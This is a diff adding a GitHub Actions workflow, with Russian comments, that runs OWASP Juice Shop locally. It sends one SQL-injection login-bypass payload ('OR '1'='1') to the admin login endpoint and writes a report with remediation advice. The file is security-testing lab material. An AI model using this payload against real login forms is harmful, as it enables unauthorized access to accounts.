@@ -1,0 +1,81 @@
+name: SQL Injection Fuzzing
+
+on:
+  workflow_dispatch:  # Ручной запуск
+  push:
+    branches: [ main ]
+  schedule:
+    - cron: '0 0 * * *'  # Запуск каждый день в полночь
+
+jobs:
+  fuzz:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Start Juice Shop
+      run: |
+        docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop
+        sleep 15
+        echo "Juice Shop запущен"
+
+    - name: Install tools
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y ffuf curl
+
+    - name: Simple SQL injection test
+      run: |
+        echo "=== Тестирование SQL инъекции ==="
+        
+        # Создаем папку для отчетов
+        mkdir -p security-reports
+        
+        # Тестируем базовый payload
+        echo "Тестируем: admin@juice-sh.op' OR '1'='1"
+        
+        RESPONSE=$(curl -s -X POST "http://localhost:3000/rest/user/login" \
+          -H "Content-Type: application/json" \
+          -d '{"email":"admin@juice-sh.op'\'' OR '\''1'\''='\''1","password":"test"}' \
+          -w "|%{http_code}")
+        
+        STATUS=$(echo $RESPONSE | cut -d'|' -f2)
+        BODY=$(echo $RESPONSE | cut -d'|' -f1)
+        
+        echo "HTTP Status: $STATUS"
+        
+        # Сохраняем результаты
+        echo "# Отчет по безопасности" > security-reports/REPORT.md
+        echo "Дата: $(date)" >> security-reports/REPORT.md
+        echo "Цель: Juice Shop (localhost:3000)" >> security-reports/REPORT.md
+        echo "" >> security-reports/REPORT.md
+        echo "## Результаты тестирования" >> security-reports/REPORT.md
+        echo "- Тестируемый payload: admin@juice-sh.op' OR '1'='1" >> security-reports/REPORT.md
+        echo "- HTTP статус ответа: $STATUS" >> security-reports/REPORT.md
+        
+        if [ "$STATUS" = "200" ]; then
+          echo "- Результат: ✅ SQL инъекция УСПЕШНА" >> security-reports/REPORT.md
+          echo "- Уязвимость найдена!" >> security-reports/REPORT.md
+        else
+          echo "- Результат: ❌ SQL инъекция НЕ сработала" >> security-reports/REPORT.md
+        fi
+        
+        echo "" >> security-reports/REPORT.md
+        echo "## Рекомендации" >> security-reports/REPORT.md
+        echo "1. Используйте параметризованные запросы" >> security-reports/REPORT.md
+        echo "2. Валидируйте входные данные" >> security-reports/REPORT.md
+        echo "3. Используйте ORM с защитой от SQL инъекций" >> security-reports/REPORT.md
+
+    - name: Upload security report
+      uses: actions/upload-artifact@v3
+      with:
+        name: security-report
+        path: security-reports/
+        retention-days: 7
+
+    - name: Cleanup
+      run: |
+        docker stop juice-shop || true
+        docker rm juice-shop || true
